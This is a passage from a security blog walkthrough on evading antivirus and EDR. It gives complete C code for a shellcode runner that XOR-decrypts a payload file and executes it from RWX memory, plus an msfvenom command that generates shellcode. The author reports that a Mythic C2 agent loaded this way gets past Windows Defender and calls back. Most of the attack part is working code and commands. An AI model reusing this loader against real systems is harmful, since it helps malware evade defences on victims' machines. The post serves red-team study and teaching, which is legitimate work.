    <span class="n">printf</span><span class="p">(</span><span class="s">"Encrypting shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">sc_xor</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">sc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Writing to file...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="n">sc_xor</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">enc_file</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Done Writing!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">fclose</span><span class="p">(</span><span class="n">enc_file</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">sc_file</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">sc_xor</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">sc</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>All that’s left to do is create our shellcode.bin, we’ll use msfvenom like we did before, but we’ll output it to a file instead.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-a</span> x64 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/x64/exec <span class="nv">cmd</span><span class="o">=</span>calc.exe <span class="nt">-f</span> raw <span class="o">&gt;</span> shellcode.bin
</pre></table></code></div></div><p>Awesome, now let’s modify our runner to read and decrypt the enc.bin file.</p><h3 id="decrypt-and-run"><span class="mr-2">Decrypt and Run</span><a href="#decrypt-and-run" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Essentially, we’ll perform the encrypter’s flow in reverse, then execute our shellcode like before.</p><p>Now that the shellcode is no longer hardcoded, we’ll need to read in the enc.bin file. We’ll also get the stats of the enc.bin file, so we can allocate memory for our character strings for the encrypted and raw shellcode. Once we read in the bytes from the file, we’ll decrypt it using the same key as we used in our encrypter.</p><p>After, the shellcode will be executed like before. Our new and improved runner, complete:</p><div file="runner.c" class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="runner.c"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">enc_file</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">input</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">stat</span> <span class="n">stats</span><span class="p">;</span>

    <span class="n">enc_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"enc.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">);</span>
    <span class="n">stat</span><span class="p">(</span><span class="s">"enc.bin"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stats</span><span class="p">);</span>

    <span class="kt">char</span><span class="o">*</span> <span class="n">enc_sc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">sc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>

    <span class="n">fread</span><span class="p">(</span><span class="n">enc_sc</span><span class="p">,</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">enc_file</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">enc_sc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>    
    <span class="p">}</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    
    <span class="n">memcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>
    
    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec</span><span class="p">)();</span>
    
    <span class="n">fclose</span><span class="p">(</span><span class="n">enc_file</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">enc_sc</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">sc</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Let’s test it out.</p><h3 id="shellcode-runner-take-two"><span class="mr-2">Shellcode Runner: Take Two</span><a href="#shellcode-runner-take-two" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>After prepping our workplace, we’re ready to begin. Compiling and executing the encrypter outputs a enc.bin. This step would take place on a machine we own and the generated enc.bin and runner.exe will be placed together on the target machine.</p><p>Next, we’ll compile and execute our runner, with AV enabled. Right away, calc.exe opens. Progress!</p><p><img data-src="/assets/img/posts/07-2022/calc-pop.png" alt="calc-success" data-proofer-ignore> <em>Calc.exe executes despite AV.</em></p><p>Okay, that’s a great proof-of-concept, but calc.exe is pretty low-hanging. Let’s spin up our favorite C2, generate some shellcode, and see if we can gain execution. For this, I’ll use Mythic with an Apollo agent.</p><p>Just for demonstration, I’ve generated an apollo executable and dropped it onto a host with Windows Defender. It’s signatured so right away, it gets flagged and quarantined, as expected.</p><p><img data-src="/assets/img/posts/07-2022/apollo-exe.png" alt="apollo.exe" data-proofer-ignore> <em>The Apollo agent gets quarantined by AV.</em></p><p>Now, back in Mythic, let’s generate a new payload, this time as shellcode. We’ll name it shellcode.bin so it’s compatible with our encrypter. We’ll put this new file in the same directory as our encrypter, and we’ll run it. If everything worked, we should get a new enc.bin file.</p><p>We’ll drop both the runner.exe and the enc.bin onto our target system, keeping them in the same directory. Like we mentioned earlier, we can have our encrypter also build our runner binary with the encrypted shellcode built in, however, this would increase the risk of detection from a method like sandboxing.</p><p>Good news, dropping the files to disk doesn’t get flagged immediately. After execution, it looks like our runner doesn’t raise suspicion with the AV and has made it to memory.</p><p><img data-src="/assets/img/posts/07-2022/v2.png" alt="v2-running" data-proofer-ignore> <em>Runner.exe in memory with Apollo, with AV enabled.</em></p><p>Back in Mythic, we can see we successfully received our callback, despite Windows Defender being enabled.</p><p><img data-src="/assets/img/posts/07-2022/callback.png" alt="mythic-callback" data-proofer-ignore> <em>The Apollo agent successfully called back to Mythic.</em></p><p>Sucess! We’ve got our malware into memory, bypassing Defender.</p><h2 id="final-thoughts"><span class="mr-2">Final Thoughts</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This runner demonstrates how encrypting our shellcode can help evade static detection methods used by AV and EDRs. However, odds are that this current iteration would be ineffective against EDRs or more sophisticated automated solutions. For instance, our runner uses the WinAPI function, <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, which gets hooked by most EDRs. We’re also allocating read/write execute (RWX) memory, which is not typically used by benign code, but is used often by malware. We’ll continue to explore bypasses to these detection methods in future posts.</p><p>Finally, I just want to emphasize that this is a means to effectively get malware on disk and execute it, but doesn’t prevent heuristic or other in-memory analysis from occurring post-execution.</p><p><img data-src="/assets/img/posts/07-2022/detected.png" alt="behavior-detected" data-proofer-ignore> <em>Runner.exe gets flagged after suspicious behavior.</em></p><p>After running a powerpick command on our agent, Windows Defender flags on this behavior and kills the process. Migrating away from this process would probably increase survivability. Regardless, the point is that, although in-memory evasion may be explored later, it is outside the scope of this series.</p><p>In part 2, we’ll continue to delve into other means to ensure our payload can bypass EDR and gain execution.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/evasion/'>Evasion</a>, <a href='/categories/shellcode-runner/'>Shellcode Runner</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/edr/" class="post-tag no-text-decoration" >edr</a> <a href="/tags/evasion/" class="post-tag no-text-decoration" >evasion</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >shellcode</a> <a href="/tags/c/" class="post-tag no-text-decoration" >c</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/xor/" class="post-tag no-text-decoration" >xor</a> <a href="/tags/encryption/" class="post-tag no-text-decoration" >encryption</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=EDR Evasion Part 1 - Basic Shellcode Runner - TidalSec&amp;url=https://tid4l.github.io/posts/EDR-Evasion-Part-1-The-Shellcode-Loader/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=EDR Evasion Part 1 - Basic Shellcode Runner - TidalSec&amp;u=https://tid4l.github.io/posts/EDR-Evasion-Part-1-The-Shellcode-Loader/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tid4l.github.io/posts/EDR-Evasion-Part-1-The-Shellcode-Loader/&amp;text=EDR Evasion Part 1 - Basic Shellcode Runner - TidalSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/">First Post and Obligatory Blog Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Sauna/"><div class="card-body"> <em class="timeago small" data-ts="1591466400" > 2020-06-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sauna</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Windows machine Sauna. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t atte...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Remote/"><div class="card-body"> <em class="timeago small" data-ts="1593799200" > 2020-07-03 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Remote</h3><div class="text-muted small"><p> This writeup is for the HackTheBox Windows machine Remote. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t att...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Cascade/"><div class="card-body"> <em class="timeago small" data-ts="1593972000" > 2020-07-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cascade</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Windows machine Cascade. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t at...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/" class="btn btn-outline-primary" prompt="Older"><p>First Post and Obligatory Blog Walkthrough</p></a> <a href="/posts/You-SPN-Me-Round-Abusing-SPNs-in-Windows-Domain-Environments/" class="btn btn-outline-primary" prompt="Newer"><p>You SPN Me Round - Abusing SPNs in Windows Domain Environments</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Chris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
